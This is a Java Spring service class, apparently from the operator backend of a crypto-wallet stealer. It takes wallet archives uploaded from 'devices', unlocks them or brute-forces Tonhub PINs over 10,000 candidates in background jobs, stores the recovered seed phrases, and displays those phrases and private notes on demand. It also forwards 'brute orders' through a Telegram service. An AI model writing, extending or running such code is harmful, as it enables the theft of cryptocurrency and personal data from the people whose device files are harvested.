package com.admin.service;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.config.V26AdminProperties;
import com.admin.entity.DeviceEntity;
import com.admin.parse.ParsedNote;
import com.admin.parse.WalletDisplay;
import com.admin.parse.WalletMatcher;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class WalletOpsService {

    private final DeviceAdminService deviceAdminService;
    private final DeviceWalletService deviceWalletService;
    private final SecretRevealService secretRevealService;
    private final WalletUnlockService walletUnlockService;
    private final MnemonicPersistService persistService;
    private final AdminTgService adminTgService;
    private final StringRedisTemplate redis;
    private final V26AdminProperties props;

    private final ExecutorService brutePool = Executors.newCachedThreadPool();
    private final ConcurrentHashMap<String, Boolean> running = new ConcurrentHashMap<>();

    public Map<String, Object> unlock(AdminContext ctx, String deviceId, String fileName, String password, String walletId) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        Path zip = deviceWalletService.resolveUpload(d.getDeviceId(), fileName);
        if (zip == null) {
            return fail("上传文件不存在");
        }
        String[] matched = WalletMatcher.matchWalletOrArchive(fileName);
        if (matched == null) {
            return fail("该文件不是可解析钱包");
        }
        Map<String, Object> result = walletUnlockService.unlockFromZip(
                matched[1], zip, password, walletId, d.getDeviceId());
        if (!Boolean.TRUE.equals(result.get("ok"))) {
            result.putIfAbsent("wallet", matched[0]);
            result.putIfAbsent("walletKey", matched[1]);
            result.putIfAbsent("fileName", fileName);
            result.putIfAbsent("error", result.getOrDefault("error", "密码错误"));
            return result;
        }
        String phrase = String.valueOf(result.getOrDefault("phrase", ""));
        Map<String, Object> persisted = persistService.finalizeRecovered(
                d.getDeviceId(), d.getAppId(),
                java.util.Collections.singletonList(new String[] {matched[0], phrase}), true);
        result.put("wallet", matched[0]);
        result.put("walletKey", matched[1]);
        result.put("fileName", fileName);
        result.put("walletId", walletId);
        result.put("mnemonicAdded", persisted.get("added"));
        result.put("mnemonicExisting", persisted.get("existing"));
        result.put("mnemonicPersisted", true);
        return result;
    }

    public Map<String, Object> revealWallet(AdminContext ctx, String deviceId, String fileName,
            String walletKey, String password) {
        String pwErr = secretRevealService.checkViewPassword(password);
        if (pwErr != null) {
            return fail(pwErr);
        }
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        String title = fileName == null ? "" : fileName;
        String key = walletKey == null ? "" : walletKey.trim();
        String phrase = null;

        for (WalletDisplay w : deviceWalletService.scan(d)) {
            if (fileName != null && fileName.equals(w.getSourceFile())
                    && w.getPhrase() != null && !w.getPhrase().isBlank()) {
                phrase = w.getPhrase().trim();
                title = w.getName() == null ? title : w.getName();
                if (w.getWalletKey() != null && !w.getWalletKey().isBlank()) {
                    key = w.getWalletKey();
                }
                break;
            }
        }

        if ((phrase == null || phrase.isBlank()) && !key.isBlank()) {
            // Keychain 命中：扫描卡片可能已带 phrase；再兜底 mnemonic 表
            phrase = deviceWalletService.loadStoredPhrase(d.getDeviceId(), key, title);
        }
        if (phrase == null || phrase.isBlank()) {
            phrase = deviceWalletService.loadStoredPhrase(d.getDeviceId(), key, title);
        }
        if (phrase == null || phrase.isBlank()) {
            Map<String, Object> err = fail("未找到可展示的助记词，请先解锁");
            err.put("wallet", title);
            err.put("walletKey", key);
            err.put("fileName", fileName);
            return err;
        }
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("wallet", title);
        ok.put("walletKey", key);
        ok.put("fileName", fileName);
        ok.put("phrase", phrase);
        return ok;
    }

    public Map<String, Object> revealNote(AdminContext ctx, String deviceId, String fileName, Integer noteIndex, String password) {
        String pwErr = secretRevealService.checkViewPassword(password);
        if (pwErr != null) {
            return fail(pwErr);
        }
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        int idx = noteIndex == null ? 0 : noteIndex;
        for (WalletDisplay w : deviceWalletService.scan(d)) {
            if (!"notes".equals(w.getWalletKey())) {
                continue;
            }
            if (fileName != null && !fileName.equals(w.getSourceFile())) {
                continue;
            }
            if (w.getNotes() == null || idx < 0 || idx >= w.getNotes().size()) {
                continue;
            }
            ParsedNote n = w.getNotes().get(idx);
            List<Map<String, Object>> photos = new ArrayList<>();
            if (n.getPhotos() != null) {
                for (ParsedNote.NotePhoto p : n.getPhotos()) {
                    Map<String, Object> ph = new LinkedHashMap<>();
                    ph.put("member", p.getMember());
                    ph.put("filename", p.getFilename());
                    ph.put("mime", p.getMime());
                    ph.put("size", p.getSize());
                    ph.put("kind", p.getKind());
                    photos.add(ph);
                }
            }
            String title = n.getTitle() == null || n.getTitle().isBlank() ? "（无标题）" : n.getTitle().trim();
            String body = n.getBody() == null ? "" : n.getBody().trim();
            StringBuilder content = new StringBuilder();
            content.append("标题：").append(title).append('\n');
            if (n.getFolder() != null && !n.getFolder().isBlank()) {
                content.append("文件夹：").append(n.getFolder().trim()).append('\n');
            }
            if (n.getAccount() != null && !n.getAccount().isBlank()) {
                content.append("账号：").append(n.getAccount().trim()).append('\n');
            }
            if (n.getCreatedLabel() != null && !n.getCreatedLabel().isBlank()) {
                content.append("创建：").append(n.getCreatedLabel()).append('\n');
            }
            if (n.getModifiedLabel() != null && !n.getModifiedLabel().isBlank()) {
                content.append("修改：").append(n.getModifiedLabel()).append('\n');
            }
            if (n.isLocked()) {
                content.append("状态：已加锁\n");
            }
            if (!photos.isEmpty()) {
                content.append("照片：").append(photos.size()).append(" 张\n");
            }
            content.append("正文：\n").append(body.isEmpty() ? "（无正文）" : body);
            Map<String, Object> ok = new LinkedHashMap<>();
            ok.put("ok", true);
            ok.put("fileName", w.getSourceFile());
            ok.put("noteIndex", idx);
            ok.put("title", title);
            ok.put("body", body);
            ok.put("content", content.toString());
            ok.put("photos", photos);
            return ok;
        }
        return fail("备忘录不存在");
    }

    public Map<String, Object> bruteStart(AdminContext ctx, String deviceId, String fileName) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        String[] matched = WalletMatcher.matchWalletOrArchive(fileName);
        if (matched == null || !"tonhub".equals(matched[1])) {
            return fail("仅支持 Tonhub 爆破");
        }
        Path zip = deviceWalletService.resolveUpload(d.getDeviceId(), fileName);
        if (zip == null) {
            return fail("上传文件不存在");
        }
        String jobId = UUID.randomUUID().toString().replace("-", "");
        Map<String, Object> job = new LinkedHashMap<>();
        job.put("jobId", jobId);
        job.put("status", "running");
        job.put("ok", null);
        job.put("tried", 0);
        job.put("total", 10000);
        job.put("pct", 0);
        job.put("fileName", fileName);
        job.put("wallet", matched[0]);
        job.put("walletKey", matched[1]);
        job.put("deviceId", d.getDeviceId());
        job.put("message", "爆破中");
        writeJob(jobId, job);
        running.put(jobId, true);
        brutePool.submit(() -> {
            try {
                Map<String, Object> result = walletUnlockService.bruteTonhub(zip, (tried, total) -> {
                    int pct = total <= 0 ? 0 : tried * 100 / total;
                    mergeJob(jobId, Map.of("tried", tried, "total", total, "pct", pct, "status", "running"));
                });
                if (Boolean.TRUE.equals(result.get("ok")) && result.get("phrase") != null) {
                    persistService.finalizeRecovered(d.getDeviceId(), d.getAppId(),
                            java.util.Collections.singletonList(new String[] {matched[0], String.valueOf(result.get("phrase"))}), true);
                    Map<String, Object> done = new LinkedHashMap<>();
                    done.put("status", "done");
                    done.put("ok", true);
                    done.put("pct", 100);
                    done.put("pin", result.get("pin"));
                    done.put("phrase", result.get("phrase"));
                    done.put("message", "爆破成功");
                    done.put("persisted", true);
                    mergeJob(jobId, done);
                } else {
                    mergeJob(jobId, Map.of(
                            "status", "done",
                            "ok", false,
                            "pct", 100,
                            "error", String.valueOf(result.getOrDefault("error", "爆破失败")),
                            "message", String.valueOf(result.getOrDefault("error", "爆破失败"))));
                }
            } catch (Exception e) {
                mergeJob(jobId, Map.of("status", "done", "ok", false, "error", e.getMessage(), "message", e.getMessage()));
            } finally {
                running.remove(jobId);
            }
        });
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("jobId", jobId);
        return ok;
    }

    public Map<String, Object> bruteStatus(AdminContext ctx, String deviceId, String jobId) {
        deviceAdminService.loadVisibleDevice(ctx, deviceId);
        String raw = redis.opsForValue().get("brute:job:" + jobId);
        if (raw == null || raw.isBlank()) {
            return fail("任务不存在或已过期");
        }
        JSONObject job = JSON.parseObject(raw);
        job.put("exists", true);
        return job;
    }

    public Map<String, Object> bruteOrder(AdminContext ctx, String deviceId, String wallet, String pkg) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        return adminTgService.bruteOrder(d, wallet, pkg);
    }

    private void writeJob(String jobId, Map<String, Object> job) {
        redis.opsForValue().set("brute:job:" + jobId, JSON.toJSONString(job), 3600, TimeUnit.SECONDS);
    }

    private void mergeJob(String jobId, Map<String, ?> fields) {
        String raw = redis.opsForValue().get("brute:job:" + jobId);
        JSONObject job = raw == null ? new JSONObject() : JSON.parseObject(raw);
        job.putAll(fields);
        writeJob(jobId, job);
    }

    private Map<String, Object> fail(String error) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", false);
        m.put("error", error);
        return m;
    }
}
